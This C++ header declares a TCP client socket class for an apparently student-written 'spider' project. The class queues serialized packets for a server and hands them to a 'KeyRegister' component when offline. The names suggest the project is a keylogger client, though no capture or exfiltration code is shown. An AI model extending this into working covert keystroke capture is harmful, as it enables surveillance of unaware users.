//
// clientTcpSocket.hpp for  in /home/gandoulf/epitech/cpp_spider/include/socket
//
// Made by Gandoulf
// Login   <gandoulf@epitech.net>
//
// Started on  Sat Nov  5 12:11:59 2016 Gandoulf
// Last update Mon Nov 14 15:33:40 2016 Gandoulf
//

#ifndef CLIENTTCPSOCKET_HPP_
# define CLIENTTCPSOCKET_HPP_

#include "spider/packetUnserializer.hpp"
#include "spider/packetSerializer.hpp"
#include "Network/sockets/Client.hpp"
#include "keyRegister/keyRegister.hpp"

#ifdef _WIN32
#include <Windows.h>
#endif
#include <list>
#include <mutex>
#include <queue>

namespace spider
{
  namespace socket
  {
    class ClientTcpSocket
    {
    public:
      ClientTcpSocket(std::string adresse, int port);
      ~ClientTcpSocket();

      //methode to use the socket
      void connect(); // connect to the server
      void close(); // disconnet the client
      template<class packet>
      void write(spider::PacketSerializer<packet> data)
      {
	_Mqueue.lock();
	_messages.push_back(data.getPackedData(1));
	_messagesSize.push_back(data.getPacketSize());
	if (!_runningService)
	  {
	    _keyRegister.write(_messages.front(), _messagesSize.front());
	    delete[] _messages.front();
	    _messages.pop_front();
	    _messagesSize.pop_front();
	  }
	_Mqueue.unlock();
      }

      // methode to manage the service
      bool startedService() const;
      void startService();
      void closeService();

      void fakeservice()
      {
	_runningService = !_runningService;
	_keyRegister.swapMode();
      }

      //setter
      void setClientID(int id);
      void setServer(std::string adresse, int port);

	  std::mutex *getQMtx();
	  std::queue<char *> &getRdQ();

    private:
      void identification();
      void readHeader();
      void readData();
      void doWrite();
      void pushFileCMD(char *bufferFileCMD, int bufferSize);

    private:
      Socket::Client				_client;
      std::string				_adresse;
      int					_port;
      int					_clientID;
      bool					_runningService;
      bool					_firstRead;

      //packet
      std::list<char *>				_messages;
      std::list<int>				_messagesSize;
      spider::PacketUnserializer		_packet;
      char					_data[128];
      std::mutex				_Mqueue;
      std::mutex _mtxQ;
      std::queue<char *> _rdQ;

      spider::KeyRegister			_keyRegister;

#ifdef _WIN32
      DWORD mainThreadId;
#endif
    };
  }
}

#endif /* CLIENTTCPSOCKET_HPP_ */
